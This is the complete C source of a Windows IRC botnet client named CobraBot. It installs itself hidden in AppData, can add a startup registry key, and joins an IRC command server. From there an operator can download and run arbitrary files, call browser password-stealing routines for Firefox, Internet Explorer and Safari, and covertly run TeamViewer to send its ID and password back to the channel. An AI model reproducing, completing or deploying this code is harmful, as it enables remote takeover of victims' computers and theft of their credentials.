
#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock2.h>
#include <tlhelp32.h>
#include <wininet.h>
#include "BotKiller.h"
#include "CobraBot.h"
#include "PasswordRecovery.h"


//#undef INCLUDE_TEAMVIEWER
#undef INCLUDE_FIREFOX
#undef INCLUDE_BOTKILLER


#define INCLUDE_FIREFOX
//#define INCLUDE_TEAMVIEWER
//#define INCLUDE_BOTKILLER


#define COPY_COBRABOT
#define COPY_TO		"%AppData%\\Bot.exe"
//#define ADD_TO_STARTUP
#define STARTUP_KEY	"CobraBot"

int ConnectSocket;

char IRCChannel[32];
char UserName[32];
char RealName[32];
char BotNick[32];
char AdminNick[32];

unsigned long ResolveAddress(char *szHost)
{
	unsigned long IP = inet_addr(szHost);
	if (IP == INADDR_NONE)
	{
		struct hostent *pHE = gethostbyname(szHost);
		if (pHE == 0) return INADDR_NONE;
		IP = *((unsigned long *)pHE->h_addr_list[0]);
	}
	return IP;
}

bool DownloadFile(char *URL, char *FileName)
{
    HINTERNET hINet, hFile;
    hINet = InternetOpen("InetURL/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if(!hINet)
    {
		#ifdef DEBUG
        printf("\nError opening hINet\n");
		#endif
		return false;
    }

	hFile = InternetOpenUrl(hINet, URL, NULL, 0, 0, 0);
	if (!hFile) return false;

	unsigned char Buffer[MAX_BUFFERSIZE];
	FILE *Output = fopen(FileName, "wb");
    DWORD dwRead;
	if (Output == NULL) return false;
	while (InternetReadFile(hFile, Buffer, sizeof(Buffer), &dwRead))
    {
		if (dwRead == 0) break;
		fwrite(Buffer, sizeof(char), dwRead, Output);
    }
	fclose(Output);
	
	InternetCloseHandle(hFile);
	InternetCloseHandle(hINet); 
	return true;
}

void irc_sendv(SOCKET sock, char *msg, ...)
{
	char msgbuf[IRCLINE];

	va_list argp;
	va_start(argp, msg);
	_vsnprintf(msgbuf, sizeof(msgbuf), msg, argp);
	send(sock, msgbuf, strlen(msgbuf), 0);

	return;
}

DWORD WINAPI irc_login()
{
	char Buffer[1024];
	irc_sendv(ConnectSocket, "USER %s 2 * :%s\r\n", UserName, RealName);
	if (recv(ConnectSocket, Buffer, sizeof(Buffer), 0) <= 0) return -1;
	irc_sendv(ConnectSocket, "NICK %s\r\n", BotNick);
	if (recv(ConnectSocket, Buffer, sizeof(Buffer), 0) <= 0) return -1;
	irc_sendv(ConnectSocket, "JOIN %s\r\n", IRCChannel);
	return 0;
}

#ifdef INCLUDE_TEAMVIEWER

static bool CheckRunning = false;

void WindowCheckThread()
{
	HANDLE ParentWindow, StatusWindow;
	if (CheckRunning) return;
	CheckRunning = true;
	while (true)
	{
		ParentWindow = FindWindow("#32770", "TeamViewer");
		if (ParentWindow != 0) ShowWindow(ParentWindow, SW_HIDE);
		StatusWindow = FindWindow("ATL:0070A138", "");
		if (StatusWindow != 0) ShowWindow(StatusWindow, SW_HIDE);
		Sleep(10);
	}
}


void KillTeamViewerProcesses()
{
	HANDLE hProcessSnap;
	HANDLE ProcessInfo;
	PROCESSENTRY32 pe32;

	if ((hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE) return;
	
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);
		return;
	}

	do
	{
		if (strcasecmp(pe32.szExeFile, "TeamViewer.exe") == 0)
		{
			ProcessInfo = OpenProcess(PROCESS_ALL_ACCESS, false, pe32.th32ProcessID);
			if (ProcessInfo != 0) 
			{
				TerminateProcess(ProcessInfo, 0);
				CloseHandle(ProcessInfo);
			}
		}
	}
	while (Process32Next(hProcessSnap, &pe32));
	CloseHandle(hProcessSnap);
	return;
}

void InitTeamViewer(char *TeamViewerLink)
{
	KillTeamViewerProcesses();
	HANDLE ParentWindow;
	
	char TeamViewerPath[MAX_FILEPATH], Password[32], ID[32];
	sprintf(TeamViewerPath, "%s\\TeamViewer.exe", getenv("APPDATA"));
	if (DownloadFile(TeamViewerLink, TeamViewerPath))
	{
		irc_sendv(ConnectSocket, ":%s!%s@%s PRIVMSG %s :TeamViewer Download started successfully, %s.\n\r", BotNick, UserName, IRC_HOST, IRCChannel, AdminNick);
	}
	else
	{
		irc_sendv(ConnectSocket, ":%s!%s@%s PRIVMSG %s :TeamViewer Download Error, Error Starting Download %s !\n\r", BotNick, UserName, IRC_HOST, IRCChannel, AdminNick);
		return;
	}
	
	ShellExecute(0, "open", TeamViewerPath, "", "", SW_HIDE);
	
	int i;
	for (i = 0; i < 100; i++)
	{
		ParentWindow = FindWindow("#32770", "TeamViewer");
		if (ParentWindow == 0) Sleep(100);
		else break;
	}
	if (ParentWindow == 0)
	{
		#ifdef DEBUG
		MessageBox(0, "Error", "", 0);
		#endif
		
		irc_sendv(ConnectSocket, ":%s!%s@%s PRIVMSG %s :Error, Unable to Execute TeamViewer !\n\r", BotNick, UserName, IRC_HOST, IRCChannel, ID, Password);
		return;
	}
	HANDLE IDHandle = FindWindowEx(ParentWindow, 0, "Edit", NULL);
	HANDLE PasswordHandle = FindWindowEx(ParentWindow, IDHandle, "Edit", NULL);
	if (IDHandle == 0 || PasswordHandle == 0)
	{
		irc_sendv(ConnectSocket, ":%s!%s@%s PRIVMSG %s :Error, Wrong TeamViewer Executable Used !\n\r", BotNick, UserName, IRC_HOST, IRCChannel, ID, Password);
		return;
	}
	for (i = 0; i < 100; i++)
	{
		SendMessage(PasswordHandle, WM_GETTEXT, sizeof(Password), (LPARAM) (void *) Password);
		if (Password[0] == '-') Sleep(100);
		else
		{
			SendMessage(IDHandle, WM_GETTEXT, sizeof(ID), (LPARAM) (void *) ID);
			break;
		}
	}
	if (Password[0] == '-')
	{
		irc_sendv(ConnectSocket, ":%s!%s@%s PRIVMSG %s :Error, TeamViewer Can't Connect to Server !\n\r", BotNick, UserName, IRC_HOST, IRCChannel, ID, Password);
		return;
	}

	irc_sendv(ConnectSocket, ":%s!%s@%s PRIVMSG %s :TeamViewer Information, ID: %s ::: Password: %s :::\n\r", BotNick, UserName, IRC_HOST, IRCChannel, ID, Password);
	
	DWORD ThreadId;
	CloseHandle(CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) WindowCheckThread, NULL, 0, &ThreadId));
	return;
}
#endif

DWORD WINAPI irc_process(char *Data, int Len)
{
	char UserNick[32], Command[1024], Password[32];
	if (Data[0] != ':') return 0;
	int i, j;
	for (i = 0; i < 32; i++)
	{
		if (Data[i + 1] == '!') break;
		UserNick[i] = Data[i + 1];
	}
	UserNick[i] = '\0';
	
	for (i = 1; i < Len; i++)
	{
		if (Data[i] == ':')
		{
			i++;
			break;
		}
	}
	
	for (j = 0; i < Len; i++, j++)
	{
		Command[j] = Data[i];
	}
	Command[j] = '\0';
	
	#ifdef DEBUG
	printf("UserNick: %s\n", UserNick);
	printf("Command: %s\n", Command);
	#endif
	
	if ((strcmp(UserNick, AdminNick) != 0) && (strncmp(Command, ".login", 6) != 0))
	{
		return 0;
	}
	
	if (strncmp(Command, ".login", 6) == 0)
	{
		StrCopy(Password, &Command[7], sizeof(Password));
		if (strcmp(Password, BOT_PASSWORD) == 0)
		{
			memset(AdminNick, '\0', 32);
			StrCopy(AdminNick, UserNick, sizeof(AdminNick));
			irc_sendv(ConnectSocket, ":%s!%s@%s PRIVMSG %s :Hello %s, Welcome Back !\n\r", BotNick, UserName, IRC_HOST, IRCChannel, AdminNick);
		}
		else
		{
			irc_sendv(ConnectSocket, ":%s!%s@%s PRIVMSG %s :Wrong Password, try again Please %s !\n\r", BotNick, UserName, IRC_HOST, IRCChannel, AdminNick);
		}
		return 0;
	}
	
	if (strncmp(Command, ".botkiller", 10) == 0)
	{
	#ifdef INCLUDE_BOTKILLER
		BotKillerThread();
	#endif
	return 0;
	
	}
	
	if (strncmp(Command, ".dlexec", 7) == 0)
	{
		char URL[1024], SaveTo[1024];
		int i, j;
		for (i = 8, j = 0; i < (int) strlen(Command); i++, j++)
		{
			if (Command[i] == ' ') break;
			URL[j] = Command[i];
		}
		i++;
		
		for (j = 0; i <= (int) strlen(Command); i++, j++)
		{
			SaveTo[j] = Command[i];
			if (Command[i] == '\0') break;
		}
		if (DownloadFile(URL, SaveTo))
		{
			irc_sendv(ConnectSocket, ":%s!%s@%s PRIVMSG %s :Download Completed Successfully, %s, Executing....\n\r", BotNick, UserName, IRC_HOST, IRCChannel, AdminNick);
			if ((int) ShellExecute(0, NULL, SaveTo, "", NULL, SW_HIDE) > 32)
			{
				irc_sendv(ConnectSocket, ":%s!%s@%s PRIVMSG %s :File Executed.\n\r", BotNick, UserName, IRC_HOST, IRCChannel);
			}
			else
			{
				irc_sendv(ConnectSocket, ":%s!%s@%s PRIVMSG %s :Error Executing File !\n\r", BotNick, UserName, IRC_HOST, IRCChannel);
			}
		}
		else
		{
			irc_sendv(ConnectSocket, ":%s!%s@%s PRIVMSG %s :Error Starting Download %s !\n\r", BotNick, UserName, IRC_HOST, IRCChannel, AdminNick);
		}
		return 0;
	}
	
	if (strncmp(Command, ".v", 2) == 0)
	{
		irc_sendv(ConnectSocket, ":%s!%s@%s PRIVMSG %s :%s\n\r", BotNick, UserName, IRC_HOST, IRCChannel, BOT_VERSION);
		return 0;
	}
	
	if (strncmp(Command, ".safari", 6) == 0)
	{
		#ifdef INCLUDE_FIREFOX
		GetAppleSafariPasswords();
		#endif
		return 0;
	}
	
	if (strncmp(Command, ".firefox", 8) == 0)
	{
		#ifdef INCLUDE_FIREFOX
		GetMozillaProductPasswords();
		#endif
		return 0;
	}
	
	if (strncmp(Command, ".ie", 3) == 0)
	{
		#ifdef INCLUDE_FIREFOX
		GetInternetExplorerPasswords();
		#endif
		return 0;
	}
	
	if (strncmp(Command, ".teamviewer", 11) == 0)
	{
		#ifdef INCLUDE_TEAMVIEWER
		InitTeamViewer(&Command[12]);
		#endif
		return 0;
	}
	
	if (strncmp(Command, ".close", 6) == 0)
	{
		irc_sendv(ConnectSocket, ":%s!%s@%s PRIVMSG %s :Goodbye...\n\r", BotNick, UserName, IRC_HOST, IRCChannel);
		exit(0);
		return 0;
	}
	
	if (strncmp(Command, ".join", 5) == 0)
	{
		StrCopy(IRCChannel, &Command[6], sizeof(IRCChannel));
		return 1;
	}
	
	if (strncmp(Command, ".uninstall", 10) == 0)
	{
		#ifdef ADD_TO_STARTUP
		DeleteRegistryValue(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", STARTUP_KEY);
		#endif
		
		exit(0);
	}
	
	return 0;
}

DWORD WINAPI irc_connect()
{
	SOCKADDR_IN ssin;
	
	char Buffer[1024];
	int BufferLen;

	while (1) 
	{
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = htons((unsigned int) IRC_PORT);
		if ((ssin.sin_addr.s_addr = ResolveAddress(IRC_HOST)) == 0) return 0;

		ConnectSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (connect(ConnectSocket, (LPSOCKADDR) &ssin, sizeof(ssin)) == SOCKET_ERROR)
		{
			closesocket(ConnectSocket);
			break;
		}
		
		#ifdef DEBUG
		printf("Bot started and connect to %s.\n", IRC_HOST);
		#endif
		
		irc_login();
		memset(Buffer, 0, sizeof(Buffer));
		
		while ((BufferLen = recv(ConnectSocket, Buffer, sizeof(Buffer), 0)) > 0)
		{
			Buffer[BufferLen] = '\0';
			
			#ifdef DEBUG
			printf("Data Received:\n%s\n============\n", Buffer);
			#endif
			
			char *Line = strtok(Buffer, "\r\n");
			do
			{
				if (irc_process(Line, strlen(Line)) != 0)
				{
					closesocket(ConnectSocket);
					return 0;
				}
				Line = strtok(NULL, "\r\n");
			}
			while (Line != NULL);
		}
		closesocket(ConnectSocket);
		Sleep(1000);
	}

	return 0;
}

char CharToUpper(char c)
{
	return ((c < 123 && c > 96) ? (c - 32) : c);
}

char *TranslateMacros(const char *Path)
{
	char *Str = malloc(strlen(Path) + 1);
	if (!Str) return NULL;
	StrCopy(Str, Path, strlen(Path) + 1);
	int StartPos = StrPosition(0, "%", Str);
	if (StartPos < 0) return (char *) Str;
	int EndPos = StrPosition(StartPos + 1, "%", Str);
	if (EndPos <= StartPos) return (char *) Str;
	int Len = EndPos - StartPos - 1;
	if (Len <= 0 || Len >= 32) return (char *) Str;
	char EnvName[32];
	StrCopy(EnvName, &Str[StartPos + 1], Len + 1);

	/*
	Need to Convert to Upper case, since all *nix Environmental Variables
	are in Uppercase, and Windows is Case-Insensetive.
	*/
	int i;
	for (i = 0; i < Len; i++) EnvName[i] = CharToUpper(EnvName[i]);
	char *TranslatedEnv = getenv(EnvName);
	if (!TranslatedEnv) return (char *) Str;
	char *Result = malloc((strlen(Str) - Len) + strlen(TranslatedEnv));
	if (!Result) return (char *) Str;
	StrCopy(&Result[0], &Str[0], StartPos + 1);
	StrCopy(&Result[StartPos], TranslatedEnv, strlen(TranslatedEnv) + 1);
	StrCopy(&Result[StartPos + strlen(TranslatedEnv)], &Str[EndPos + 1], strlen(Str) - EndPos + 1);
	free(Str);
	return Result;
}

#ifdef ADD_TO_STARTUP
bool WriteRegistryKey(const HKEY hKey, const char *lpSubKey, const char *lpValueName, const char *lpValueData)
{
	bool Result = false;
	HKEY hResult;
	if (RegCreateKeyEx(hKey, lpSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hResult, NULL) == ERROR_SUCCESS)
	{
		Result = (RegSetValueEx(hResult, lpValueName, 0, REG_SZ, (const unsigned char *) lpValueData, strlen(lpValueData)) == ERROR_SUCCESS);
		RegCloseKey(hResult);
	}
	return Result;
}

bool DeleteRegistryValue(const HKEY hKey, const char *lpSubKey, const char *lpValueName)
{
	HKEY hResult;
	bool Result = false;
	if (RegOpenKeyEx(hKey, lpSubKey, 0, KEY_WRITE, &hResult) == ERROR_SUCCESS)
	{
		Result = (RegDeleteValue(hResult, lpValueName) == ERROR_SUCCESS);
		RegCloseKey(hResult);
	}
	return Result;
}
#endif

void InstallBot()
{
	// Hide System Messages if bot crashes
	SetErrorMode(SEM_NOGPFAULTERRORBOX);
	
	// check if this exe is running already
	if (WaitForSingleObject(CreateMutex(NULL, FALSE, BOT_MUTEX), 30000) == WAIT_TIMEOUT)
		ExitProcess(EXIT_FAILURE);
	
	#ifdef COPY_COBRABOT
	char CurrentPath[MAX_FILEPATH];
	char *RequiredPath = TranslateMacros(COPY_TO);
	if (RequiredPath == NULL) return;
	GetModuleFileName(NULL, CurrentPath, sizeof(CurrentPath));
	if (strcasecmp(RequiredPath, CurrentPath) != 0)
	{
		if (CopyFile(CurrentPath, RequiredPath, false))
		{
			ShellExecute(0, NULL, RequiredPath, "", NULL, SW_HIDE);
			exit(0);
		}
	}
	#endif
	
	#ifdef ADD_TO_STARTUP
	WriteRegistryKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", STARTUP_KEY, CurrentPath);
	#endif
}

int _main()
{
	InstallBot();
	
	WSADATA WSAdata;
	if (WSAStartup(MAKEWORD(2, 2), &WSAdata) != 0) return 0;
	if (LOBYTE(WSAdata.wVersion) != 2 || HIBYTE(WSAdata.wVersion) != 2)
	{
		WSACleanup();
		return 0;
	}
	
	sprintf(BotNick, "[%s][%s]%s", getenv("COMPUTERNAME"), getenv("USERNAME"), "KyMeraBoT");
	StrCopy(UserName, getenv("USERNAME"), sizeof(UserName));
	StrCopy(RealName, getenv("USERNAME"), sizeof(RealName));
	StrCopy(IRCChannel, IRC_CHANNEL, sizeof(IRCChannel));
	memset(AdminNick, '\0', 32);
	
	while (1)
	{
		irc_connect();
		Sleep(5000);
	}
	
	exit(0);
	return 0;
}
